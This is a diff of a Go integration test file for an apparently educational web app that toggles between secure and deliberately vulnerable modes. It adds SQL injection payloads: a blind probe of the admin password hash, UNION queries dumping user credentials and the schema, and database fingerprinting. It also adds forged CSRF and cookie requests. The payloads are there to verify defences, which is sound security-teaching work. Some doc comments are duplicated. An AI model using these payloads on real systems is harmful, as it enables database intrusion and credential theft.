@@ -18,8 +18,10 @@ import (
 	dbpkg "BAI_1IZ21B_PROJEKT/internal/db"
 
 	"github.com/gin-gonic/gin"
+	"golang.org/x/crypto/bcrypt"
 )
 
+// postDTO mirrors the JSON payload used by the post API tests.
 type postDTO struct {
 	ID          int    `json:"id"`
 	Title       string `json:"title"`
@@ -27,18 +29,36 @@ type postDTO struct {
 	Published   int    `json:"published"`
 }
 
+// setupIntegrationTestApp creates an isolated test application with vulnerable
+// mode disabled by default.
+//
+// Inputs:
+//   - t: testing handle used for cleanup and fatal failures.
+//
+// Outputs:
+//   - *gin.Engine: configured test router.
+//   - *sql.DB: isolated SQLite connection used by the test.
+//   - string: temporary database path.
 func setupIntegrationTestApp(t *testing.T) (*gin.Engine, *sql.DB, string) {
 	t.Helper()
 	return setupIntegrationTestAppWithSecurity(t, false)
 }
 
+// setupIntegrationTestAppWithSecurity creates an isolated test application and
+// lets the caller choose the active security mode.
+//
+// Inputs:
+//   - t: testing handle used for cleanup and fatal failures.
+//   - securityEnabled: initial security mode for the test application.
+//
+// Outputs:
+//   - *gin.Engine: configured test router.
+//   - *sql.DB: isolated SQLite connection used by the test.
+//   - string: temporary database path.
 func setupIntegrationTestAppWithSecurity(t *testing.T, securityEnabled bool) (*gin.Engine, *sql.DB, string) {
 	t.Helper()
 
 	gin.SetMode(gin.TestMode)
-	previousSecurity := SecurityEnabled
-	SecurityEnabled = securityEnabled
-	t.Cleanup(func() { SecurityEnabled = previousSecurity })
 
 	tmpDir := t.TempDir()
 	dbPath := filepath.Join(tmpDir, "integration.db")
@@ -47,11 +67,22 @@ func setupIntegrationTestAppWithSecurity(t *testing.T, securityEnabled bool) (*g
 	dbpkg.MigrateDB(db)
 	dbpkg.SeedDB(db, securityEnabled)
 
-	router := buildRouter(db)
+	router := buildRouter(db, securityEnabled)
 
 	return router, db, dbPath
 }
 
+// doRequest sends a raw request against the test router and returns the recorder.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - router: test Gin engine.
+//   - method: HTTP method to send.
+//   - path: request path.
+//   - body: request body payload.
+//
+// Output:
+//   - *httptest.ResponseRecorder: captured response.
 func doRequest(t *testing.T, router *gin.Engine, method, path, body string) *httptest.ResponseRecorder {
 	t.Helper()
 
@@ -64,6 +95,17 @@ func doRequest(t *testing.T, router *gin.Engine, method, path, body string) *htt
 	return w
 }
 
+// doFormRequest sends an application/x-www-form-urlencoded request.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - router: test Gin engine.
+//   - method: HTTP method to send.
+//   - path: request path.
+//   - body: form-encoded body payload.
+//
+// Output:
+//   - *httptest.ResponseRecorder: captured response.
 func doFormRequest(t *testing.T, router *gin.Engine, method, path, body string) *httptest.ResponseRecorder {
 	t.Helper()
 
@@ -76,6 +118,45 @@ func doFormRequest(t *testing.T, router *gin.Engine, method, path, body string) 
 	return w
 }
 
+// doFormRequestWithCookie sends a form request with a Cookie header attached.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - router: test Gin engine.
+//   - method: HTTP method to send.
+//   - path: request path.
+//   - body: form-encoded body payload.
+//   - cookie: Cookie header value to attach.
+//
+// Output:
+//   - *httptest.ResponseRecorder: captured response.
+func doFormRequestWithCookie(t *testing.T, router *gin.Engine, method, path, body, cookie string) *httptest.ResponseRecorder {
+	t.Helper()
+
+	req := httptest.NewRequest(method, path, strings.NewReader(body))
+	if body != "" {
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
+	if cookie != "" {
+		req.Header.Set("Cookie", cookie)
+	}
+	w := httptest.NewRecorder()
+	router.ServeHTTP(w, req)
+	return w
+}
+
+// doRequestWithCookie sends a raw request with a Cookie header attached.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - router: test Gin engine.
+//   - method: HTTP method to send.
+//   - path: request path.
+//   - body: request body payload.
+//   - cookie: Cookie header value to attach.
+//
+// Output:
+//   - *httptest.ResponseRecorder: captured response.
 func doRequestWithCookie(t *testing.T, router *gin.Engine, method, path, body, cookie string) *httptest.ResponseRecorder {
 	t.Helper()
 
@@ -91,6 +172,34 @@ func doRequestWithCookie(t *testing.T, router *gin.Engine, method, path, body, c
 	return w
 }
 
+// responseCookieValue extracts a named cookie value from a response recorder.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - resp: response recorder to inspect.
+//   - name: cookie name to look up.
+//
+// Output:
+//   - string: cookie value when present.
+func responseCookieValue(t *testing.T, resp *httptest.ResponseRecorder, name string) string {
+	t.Helper()
+	for _, cookie := range resp.Result().Cookies() {
+		if cookie.Name == name {
+			return cookie.Value
+		}
+	}
+	t.Fatalf("missing cookie %q in %v", name, resp.Header().Values("Set-Cookie"))
+	return ""
+}
+
+// extractCreatedID parses the numeric id field from a create-response payload.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - body: response body containing JSON.
+//
+// Output:
+//   - int: parsed identifier.
 func extractCreatedID(t *testing.T, body []byte) int {
 	t.Helper()
 
@@ -120,6 +229,7 @@ func extractCreatedID(t *testing.T, body []byte) int {
 	return 0
 }
 
+// TestIntegration_Ping verifies that the basic health endpoint responds with pong.
 func TestIntegration_Ping(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -139,6 +249,7 @@ func TestIntegration_Ping(t *testing.T) {
 	}
 }
 
+// TestIntegration_Posts verifies the published-posts API and create flow.
 func TestIntegration_Posts(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -164,6 +275,7 @@ func TestIntegration_Posts(t *testing.T) {
 	}
 }
 
+// TestIntegration_Login verifies login behavior through the JSON API.
 func TestIntegration_Login(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -190,6 +302,8 @@ func TestIntegration_Login(t *testing.T) {
 	})
 }
 
+// TestIntegration_DatabaseFileIsCreated verifies that initialization creates the DB file.
+// TestIntegration_DatabaseFileIsCreated verifies that initialization creates the DB file.
 func TestIntegration_DatabaseFileIsCreated(t *testing.T) {
 	_, db, dbPath := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -199,6 +313,8 @@ func TestIntegration_DatabaseFileIsCreated(t *testing.T) {
 	}
 }
 
+// TestIntegration_UI_PostsPage verifies that the posts page renders successfully.
+// TestIntegration_UI_PostsPage verifies that the posts page renders successfully.
 func TestIntegration_UI_PostsPage(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -213,11 +329,13 @@ func TestIntegration_UI_PostsPage(t *testing.T) {
 	}
 
 	body := resp.Body.String()
-	if !strings.Contains(body, "Create Post") {
+	if !strings.Contains(body, "Create fan post") {
 		t.Fatalf("expected posts page marker in body, got: %s", body)
 	}
 }
 
+// TestIntegration_UI_LoginPage verifies that the login page renders successfully.
+// TestIntegration_UI_LoginPage verifies that the login page renders successfully.
 func TestIntegration_UI_LoginPage(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -237,6 +355,8 @@ func TestIntegration_UI_LoginPage(t *testing.T) {
 	}
 }
 
+// TestIntegration_UI_LoginSubmit verifies the browser login submission flow.
+// TestIntegration_UI_LoginSubmit verifies the browser login submission flow.
 func TestIntegration_UI_LoginSubmit(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -262,6 +382,8 @@ func TestIntegration_UI_LoginSubmit(t *testing.T) {
 	})
 }
 
+// TestIntegration_UI_PostsPartial verifies the HTMX posts fragment.
+// TestIntegration_UI_PostsPartial verifies the HTMX posts fragment.
 func TestIntegration_UI_PostsPartial(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -281,6 +403,8 @@ func TestIntegration_UI_PostsPartial(t *testing.T) {
 	}
 }
 
+// TestIntegration_UI_LoginPartial verifies the HTMX login fragment.
+// TestIntegration_UI_LoginPartial verifies the HTMX login fragment.
 func TestIntegration_UI_LoginPartial(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -318,6 +442,8 @@ func TestIntegration_UI_LoginPartial(t *testing.T) {
 	})
 }
 
+// TestIntegration_UIModeToggle verifies the runtime secure/vulnerable toggle.
+// TestIntegration_UIModeToggle verifies the runtime secure/vulnerable toggle.
 func TestIntegration_UIModeToggle(t *testing.T) {
 	router, db, _ := setupIntegrationTestAppWithSecurity(t, false)
 	t.Cleanup(func() { _ = db.Close() })
@@ -346,7 +472,7 @@ func TestIntegration_UIModeToggle(t *testing.T) {
 		t.Fatalf("expected secure badge and vulnerable switch button, got: %s", securePage.Body.String())
 	}
 
-	payload := url.QueryEscape("' OR 1=1 --")
+	payload := url.QueryEscape("zz' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND substr(password_hash,1,1)='a') --")
 	searchResp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
 	if searchResp.Code != http.StatusOK {
 		t.Fatalf("expected status %d, got %d", http.StatusOK, searchResp.Code)
@@ -357,6 +483,184 @@ func TestIntegration_UIModeToggle(t *testing.T) {
 	}
 }
 
+// TestIntegration_SeedDB_RewritesDemoCredentialsForSecurityMode verifies that seeding respects the active mode.
+// TestIntegration_SeedDB_RewritesDemoCredentialsForSecurityMode verifies that seeding respects the active mode.
+func TestIntegration_SeedDB_RewritesDemoCredentialsForSecurityMode(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+
+	tmpDir := t.TempDir()
+	dbPath := filepath.Join(tmpDir, "seed-mode.db")
+	dbConn := dbpkg.InitDB(dbPath)
+	t.Cleanup(func() { _ = dbConn.Close() })
+
+	dbpkg.MigrateDB(dbConn)
+	dbpkg.SeedDB(dbConn, false)
+
+	var vulnerableStored string
+	if err := dbConn.QueryRow("SELECT password_hash FROM users WHERE username = 'admin'").Scan(&vulnerableStored); err != nil {
+		t.Fatalf("read vulnerable admin password: %v", err)
+	}
+	if vulnerableStored != "admin" {
+		t.Fatalf("expected vulnerable seed to store plaintext admin password, got %q", vulnerableStored)
+	}
+
+	dbpkg.SeedDB(dbConn, true)
+
+	var secureStored string
+	if err := dbConn.QueryRow("SELECT password_hash FROM users WHERE username = 'admin'").Scan(&secureStored); err != nil {
+		t.Fatalf("read secure admin password: %v", err)
+	}
+	if secureStored == "admin" {
+		t.Fatalf("secure re-seed must not leave plaintext admin password")
+	}
+	if err := bcrypt.CompareHashAndPassword([]byte(secureStored), []byte("admin")); err != nil {
+		t.Fatalf("secure re-seed should store a bcrypt hash for admin password: %v", err)
+	}
+}
+
+// TestIntegration_SecureAuthCookieIsSignedAndSameSiteStrict verifies the secure login cookie settings.
+// TestIntegration_SecureAuthCookieIsSignedAndSameSiteStrict verifies the secure login cookie settings.
+func TestIntegration_SecureAuthCookieIsSignedAndSameSiteStrict(t *testing.T) {
+	router, db, _ := setupIntegrationTestAppWithSecurity(t, true)
+	t.Cleanup(func() { _ = db.Close() })
+
+	resp := doRequest(t, router, http.MethodPost, "/login", `{"username":"admin","password":"admin"}`)
+	if resp.Code != http.StatusOK {
+		t.Fatalf("expected status %d, got %d", http.StatusOK, resp.Code)
+	}
+
+	setCookie := resp.Header().Get("Set-Cookie")
+	authValue := responseCookieValue(t, resp, "bai_auth_user")
+	decodedAuthValue, err := url.QueryUnescape(authValue)
+	if err != nil {
+		t.Fatalf("decode auth cookie value: %v", err)
+	}
+	if !strings.HasPrefix(decodedAuthValue, "admin|") {
+		t.Fatalf("expected signed auth cookie value, got %q", authValue)
+	}
+	if !strings.Contains(setCookie, "HttpOnly") {
+		t.Fatalf("expected HttpOnly auth cookie, got %q", setCookie)
+	}
+	if !strings.Contains(setCookie, "SameSite=Strict") {
+		t.Fatalf("expected SameSite=Strict auth cookie, got %q", setCookie)
+	}
+
+	forgedCookie := "bai_auth_user=admin"
+	forgedResp := doRequestWithCookie(t, router, http.MethodPost, "/posts", `{"title":"forged","post_content":"x","published":1}`, forgedCookie)
+	if forgedResp.Code != http.StatusUnauthorized {
+		t.Fatalf("expected forged unsigned cookie to be rejected, got %d (body=%s)", forgedResp.Code, forgedResp.Body.String())
+	}
+}
+
+// TestIntegration_CSRFSecureFormRejectsAndAcceptsTokens verifies CSRF token enforcement.
+// TestIntegration_CSRFSecureFormRejectsAndAcceptsTokens verifies CSRF token enforcement.
+func TestIntegration_CSRFSecureFormRejectsAndAcceptsTokens(t *testing.T) {
+	router, db, _ := setupIntegrationTestAppWithSecurity(t, true)
+	t.Cleanup(func() { _ = db.Close() })
+
+	loginResp := doRequest(t, router, http.MethodPost, "/login", `{"username":"admin","password":"admin"}`)
+	if loginResp.Code != http.StatusOK {
+		t.Fatalf("expected login status %d, got %d", http.StatusOK, loginResp.Code)
+	}
+	authValue := responseCookieValue(t, loginResp, "bai_auth_user")
+	authCookie := "bai_auth_user=" + authValue
+
+	rejectResp := doFormRequestWithCookie(t, router, http.MethodPost, "/ui/csrf-secure", "new_email=blocked%40example.com", authCookie)
+	if rejectResp.Code != http.StatusForbidden {
+		t.Fatalf("expected missing CSRF token to be rejected, got %d", rejectResp.Code)
+	}
+	if !strings.Contains(rejectResp.Header().Get("Content-Type"), "text/html") {
+		t.Fatalf("expected CSRF reject to render HTML UI, got %s", rejectResp.Header().Get("Content-Type"))
+	}
+	if !strings.Contains(rejectResp.Body.String(), "CSRF token validation failed") {
+		t.Fatalf("expected CSRF validation message, got: %s", rejectResp.Body.String())
+	}
+
+	formResp := doRequestWithCookie(t, router, http.MethodGet, "/ui/csrf-secure", "", authCookie)
+	if formResp.Code != http.StatusOK {
+		t.Fatalf("expected CSRF form status %d, got %d", http.StatusOK, formResp.Code)
+	}
+	csrfValue := responseCookieValue(t, formResp, "bai_csrf_token")
+	validCookie := authCookie + "; bai_csrf_token=" + csrfValue
+
+	body := "new_email=secure%40example.com&csrf_token=" + url.QueryEscape(csrfValue)
+	acceptResp := doFormRequestWithCookie(t, router, http.MethodPost, "/ui/csrf-secure", body, validCookie)
+	if acceptResp.Code != http.StatusOK {
+		t.Fatalf("expected valid CSRF token to be accepted, got %d (body=%s)", acceptResp.Code, acceptResp.Body.String())
+	}
+	if !strings.Contains(acceptResp.Body.String(), "Email updated to secure@example.com") {
+		t.Fatalf("expected successful email update message, got: %s", acceptResp.Body.String())
+	}
+}
+
+// TestIntegration_ProfileEndpointHonorsSecurityModeForCSRF verifies the profile form dispatch.
+// TestIntegration_ProfileEndpointHonorsSecurityModeForCSRF verifies the profile form dispatch.
+func TestIntegration_ProfileEndpointHonorsSecurityModeForCSRF(t *testing.T) {
+	t.Run("vulnerable mode accepts forged profile POST without token", func(t *testing.T) {
+		router, db, _ := setupIntegrationTestAppWithSecurity(t, false)
+		t.Cleanup(func() { _ = db.Close() })
+
+		loginResp := doRequest(t, router, http.MethodPost, "/login", `{"username":"admin","password":"anything"}`)
+		if loginResp.Code != http.StatusOK {
+			t.Fatalf("expected login status %d, got %d", http.StatusOK, loginResp.Code)
+		}
+		authCookie := loginResp.Header().Get("Set-Cookie")
+
+		resp := doFormRequestWithCookie(t, router, http.MethodPost, "/ui/profile", "new_email=csrf-pwned%40evil.test", authCookie)
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected vulnerable profile update to succeed, got %d body=%s", resp.Code, resp.Body.String())
+		}
+
+		var email string
+		if err := db.QueryRow("SELECT email FROM users WHERE username = 'admin'").Scan(&email); err != nil {
+			t.Fatalf("query admin email: %v", err)
+		}
+		if email != "csrf-pwned@evil.test" {
+			t.Fatalf("expected forged profile POST to update email, got %q", email)
+		}
+	})
+
+	t.Run("secure mode rejects same profile POST without token", func(t *testing.T) {
+		router, db, _ := setupIntegrationTestAppWithSecurity(t, true)
+		t.Cleanup(func() { _ = db.Close() })
+
+		loginResp := doRequest(t, router, http.MethodPost, "/login", `{"username":"admin","password":"admin"}`)
+		if loginResp.Code != http.StatusOK {
+			t.Fatalf("expected login status %d, got %d", http.StatusOK, loginResp.Code)
+		}
+		authValue := responseCookieValue(t, loginResp, "bai_auth_user")
+		authCookie := "bai_auth_user=" + authValue
+
+		rejectResp := doFormRequestWithCookie(t, router, http.MethodPost, "/ui/profile", "new_email=blocked%40evil.test", authCookie)
+		if rejectResp.Code != http.StatusForbidden {
+			t.Fatalf("expected secure profile POST without token to be rejected, got %d body=%s", rejectResp.Code, rejectResp.Body.String())
+		}
+
+		var email string
+		if err := db.QueryRow("SELECT email FROM users WHERE username = 'admin'").Scan(&email); err != nil {
+			t.Fatalf("query admin email: %v", err)
+		}
+		if email == "blocked@evil.test" {
+			t.Fatal("secure profile endpoint updated email despite missing CSRF token")
+		}
+
+		formResp := doRequestWithCookie(t, router, http.MethodGet, "/ui/profile", "", authCookie)
+		if formResp.Code != http.StatusOK {
+			t.Fatalf("expected profile form status %d, got %d", http.StatusOK, formResp.Code)
+		}
+		csrfValue := responseCookieValue(t, formResp, "bai_csrf_token")
+		validCookie := authCookie + "; bai_csrf_token=" + csrfValue
+
+		body := "new_email=secure-profile%40example.com&csrf_token=" + url.QueryEscape(csrfValue)
+		acceptResp := doFormRequestWithCookie(t, router, http.MethodPost, "/ui/profile", body, validCookie)
+		if acceptResp.Code != http.StatusOK {
+			t.Fatalf("expected secure profile POST with token to succeed, got %d body=%s", acceptResp.Code, acceptResp.Body.String())
+		}
+	})
+}
+
+// TestIntegration_Register verifies user registration through the API.
+// TestIntegration_Register verifies user registration through the API.
 func TestIntegration_Register(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -385,6 +689,8 @@ func TestIntegration_Register(t *testing.T) {
 	})
 }
 
+// TestIntegration_DeleteAuthorization_SecurityEnabled verifies owner/admin delete checks in secure mode.
+// TestIntegration_DeleteAuthorization_SecurityEnabled verifies owner/admin delete checks in secure mode.
 func TestIntegration_DeleteAuthorization_SecurityEnabled(t *testing.T) {
 	router, db, _ := setupIntegrationTestAppWithSecurity(t, true)
 	t.Cleanup(func() { _ = db.Close() })
@@ -439,6 +745,14 @@ func TestIntegration_DeleteAuthorization_SecurityEnabled(t *testing.T) {
 // SQL Injection — vulnerable vs secure mode
 // ---------------------------------------------------------------------------
 
+// decodeSearchResults parses the JSON payload returned by the search endpoints.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - body: response body containing JSON.
+//
+// Output:
+//   - []map[string]any: decoded search result rows.
 func decodeSearchResults(t *testing.T, body []byte) []map[string]any {
 	t.Helper()
 	var payload struct {
@@ -450,6 +764,8 @@ func decodeSearchResults(t *testing.T, body []byte) []map[string]any {
 	return payload.Results
 }
 
+// TestIntegration_SearchSQLi_VulnerableMode verifies the force-vulnerable SQLi demo.
+// TestIntegration_SearchSQLi_VulnerableMode verifies the force-vulnerable SQLi demo.
 func TestIntegration_SearchSQLi_VulnerableMode(t *testing.T) {
 	router, db, _ := setupIntegrationTestAppWithSecurity(t, false)
 	t.Cleanup(func() { _ = db.Close() })
@@ -474,9 +790,22 @@ func TestIntegration_SearchSQLi_VulnerableMode(t *testing.T) {
 		}
 	})
 
-	t.Run("OR 1=1 leaks every row (including drafts)", func(t *testing.T) {
-		// `' OR 1=1 --` closes the title literal and turns WHERE into a tautology.
-		payload := url.QueryEscape("' OR 1=1 --")
+	t.Run("ORDER BY probe leaks SELECT shape through SQL error", func(t *testing.T) {
+		payload := url.QueryEscape("zz' ORDER BY 8 --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusInternalServerError {
+			t.Fatalf("expected vulnerable ORDER BY probe to fail with 500, got %d (body=%s)", resp.Code, resp.Body.String())
+		}
+		if !strings.Contains(resp.Body.String(), "ORDER BY") && !strings.Contains(resp.Body.String(), "range") {
+			t.Fatalf("expected database error to reveal ORDER BY/column-count detail, body=%s", resp.Body.String())
+		}
+	})
+
+	t.Run("boolean probe confirms admin password prefix and leaks rows", func(t *testing.T) {
+		// This is more realistic than a bare tautology: the attacker asks the
+		// database a yes/no question about another table. In vulnerable mode the
+		// true predicate expands the result set and confirms the guessed prefix.
+		payload := url.QueryEscape("zz' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND substr(password_hash,1,1)='a') --")
 		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
 		if resp.Code != http.StatusOK {
 			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
@@ -501,7 +830,7 @@ func TestIntegration_SearchSQLi_VulnerableMode(t *testing.T) {
 	})
 
 	t.Run("UNION SELECT exfiltrates user table", func(t *testing.T) {
-		payload := url.QueryEscape("zz' UNION SELECT id, username, password_hash, 1, '', '', '' FROM users --")
+		payload := url.QueryEscape("zz' UNION SELECT id, '[user] ' || username, 'role=' || role || ' email=' || email || ' secret=' || password_hash, 1, username, '', '' FROM users --")
 		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
 		if resp.Code != http.StatusOK {
 			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
@@ -510,10 +839,10 @@ func TestIntegration_SearchSQLi_VulnerableMode(t *testing.T) {
 		if len(results) == 0 {
 			t.Fatalf("expected UNION to surface rows, got 0 (body=%s)", resp.Body.String())
 		}
-		// One of the surfaced "titles" must be a username (admin/user1).
+		// One of the surfaced "titles" must be a tagged username (admin/user1).
 		gotUser := false
 		for _, r := range results {
-			if title, _ := r["title"].(string); title == "admin" || title == "user1" {
+			if title, _ := r["title"].(string); title == "[user] admin" || title == "[user] user1" {
 				gotUser = true
 				break
 			}
@@ -522,8 +851,109 @@ func TestIntegration_SearchSQLi_VulnerableMode(t *testing.T) {
 			t.Fatalf("expected username to leak as title via UNION, body=%s", resp.Body.String())
 		}
 	})
+
+	t.Run("UNION SELECT enumerates sqlite schema", func(t *testing.T) {
+		payload := url.QueryEscape("zz' UNION SELECT 1, name, sql, 1, '', '', '' FROM sqlite_master WHERE type='table' --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		gotUsersTable := false
+		for _, r := range results {
+			if title, _ := r["title"].(string); title == "users" {
+				gotUsersTable = true
+				break
+			}
+		}
+		if !gotUsersTable {
+			t.Fatalf("expected sqlite_master UNION to reveal users table, body=%s", resp.Body.String())
+		}
+	})
+
+	t.Run("UNION SELECT leaks hidden drafts directly", func(t *testing.T) {
+		payload := url.QueryEscape("zz' UNION SELECT id, '[draft] ' || title, post_content, published, author_username, '', '' FROM blog WHERE published=0 --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		gotDraft := false
+		for _, r := range results {
+			if title, _ := r["title"].(string); title == "[draft] Internal draft" {
+				gotDraft = true
+				break
+			}
+		}
+		if !gotDraft {
+			t.Fatalf("expected direct draft UNION leak, body=%s", resp.Body.String())
+		}
+	})
+
+	t.Run("UNION SELECT builds database intelligence summary row", func(t *testing.T) {
+		payload := url.QueryEscape("zz' UNION SELECT 9000, '[intel] database map', 'users=' || (SELECT COUNT(*) FROM users) || ' tables=' || (SELECT group_concat(name, ', ') FROM sqlite_master WHERE type='table'), 1, 'sqli-bot', '', '' --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		gotSummary := false
+		for _, r := range results {
+			title, _ := r["title"].(string)
+			content, _ := r["post_content"].(string)
+			if title == "[intel] database map" && strings.Contains(content, "users=") && strings.Contains(content, "blog") {
+				gotSummary = true
+				break
+			}
+		}
+		if !gotSummary {
+			t.Fatalf("expected injected intelligence summary row, body=%s", resp.Body.String())
+		}
+	})
+
+	t.Run("UNION SELECT fingerprints SQLite engine", func(t *testing.T) {
+		payload := url.QueryEscape("zz' UNION SELECT 9001, '[fingerprint] SQLite ' || sqlite_version(), sqlite_source_id(), 1, 'sqli-bot', '', '' --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		gotFingerprint := false
+		for _, r := range results {
+			if title, _ := r["title"].(string); strings.HasPrefix(title, "[fingerprint] SQLite ") {
+				gotFingerprint = true
+				break
+			}
+		}
+		if !gotFingerprint {
+			t.Fatalf("expected SQLite fingerprint row, body=%s", resp.Body.String())
+		}
+	})
+
+	t.Run("UNION SELECT pivots admin row into hidden draft summary", func(t *testing.T) {
+		payload := url.QueryEscape("zz' UNION SELECT 9002, '[pivot] ' || username || ' owns drafts', (SELECT group_concat(title, ' | ') FROM blog WHERE published=0), 1, username, '', '' FROM users WHERE role='admin' --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		gotPivot := false
+		for _, r := range results {
+			title, _ := r["title"].(string)
+			content, _ := r["post_content"].(string)
+			if title == "[pivot] admin owns drafts" && strings.Contains(content, "Internal draft") {
+				gotPivot = true
+				break
+			}
+		}
+		if !gotPivot {
+			t.Fatalf("expected admin-to-draft pivot row, body=%s", resp.Body.String())
+		}
+	})
 }
 
+// TestIntegration_SearchSQLi_SecureMode verifies the parameterized secure search path.
+// TestIntegration_SearchSQLi_SecureMode verifies the parameterized secure search path.
 func TestIntegration_SearchSQLi_SecureMode(t *testing.T) {
 	router, db, _ := setupIntegrationTestAppWithSecurity(t, true)
 	t.Cleanup(func() { _ = db.Close() })
@@ -535,8 +965,8 @@ func TestIntegration_SearchSQLi_SecureMode(t *testing.T) {
 		t.Fatalf("seed draft: %v", err)
 	}
 
-	t.Run("OR 1=1 is treated as a literal pattern (no leak)", func(t *testing.T) {
-		payload := url.QueryEscape("' OR 1=1 --")
+	t.Run("boolean probe is treated as a literal pattern (no leak)", func(t *testing.T) {
+		payload := url.QueryEscape("zz' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND substr(password_hash,1,1)='a') --")
 		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
 		if resp.Code != http.StatusOK {
 			t.Fatalf("expected 200, got %d (body=%s)", resp.Code, resp.Body.String())
@@ -547,8 +977,20 @@ func TestIntegration_SearchSQLi_SecureMode(t *testing.T) {
 		}
 	})
 
+	t.Run("ORDER BY probe is treated as literal text, not SQL syntax", func(t *testing.T) {
+		payload := url.QueryEscape("zz' ORDER BY 8 --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200 in secure mode, got %d (body=%s)", resp.Code, resp.Body.String())
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		if len(results) != 0 {
+			t.Fatalf("expected 0 results for literal ORDER BY probe in secure mode, got %d", len(results))
+		}
+	})
+
 	t.Run("UNION payload also returns no rows (parameterized)", func(t *testing.T) {
-		payload := url.QueryEscape("zz' UNION SELECT id, username, password_hash, 1, '', '', '' FROM users --")
+		payload := url.QueryEscape("zz' UNION SELECT id, '[user] ' || username, 'role=' || role || ' email=' || email || ' secret=' || password_hash, 1, username, '', '' FROM users --")
 		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
 		if resp.Code != http.StatusOK {
 			t.Fatalf("expected 200, got %d", resp.Code)
@@ -556,6 +998,48 @@ func TestIntegration_SearchSQLi_SecureMode(t *testing.T) {
 		results := decodeSearchResults(t, resp.Body.Bytes())
 		if len(results) != 0 {
 			t.Fatalf("expected 0 results for UNION in secure mode, got %d", len(results))
+		}
+	})
+
+	t.Run("sqlite_master UNION payload also returns no rows (parameterized)", func(t *testing.T) {
+		payload := url.QueryEscape("zz' UNION SELECT 1, name, sql, 1, '', '', '' FROM sqlite_master WHERE type='table' --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d", resp.Code)
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		if len(results) != 0 {
+			t.Fatalf("expected 0 results for sqlite_master UNION in secure mode, got %d", len(results))
+		}
+	})
+
+	t.Run("hidden draft UNION payload also returns no rows (parameterized)", func(t *testing.T) {
+		payload := url.QueryEscape("zz' UNION SELECT id, '[draft] ' || title, post_content, published, author_username, '', '' FROM blog WHERE published=0 --")
+		resp := doRequest(t, router, http.MethodGet, "/api/search?q="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d", resp.Code)
+		}
+		results := decodeSearchResults(t, resp.Body.Bytes())
+		if len(results) != 0 {
+			t.Fatalf("expected 0 results for hidden draft UNION in secure mode, got %d", len(results))
+		}
+	})
+
+	t.Run("advanced UNION payloads also return no rows (parameterized)", func(t *testing.T) {
+		payloads := []string{
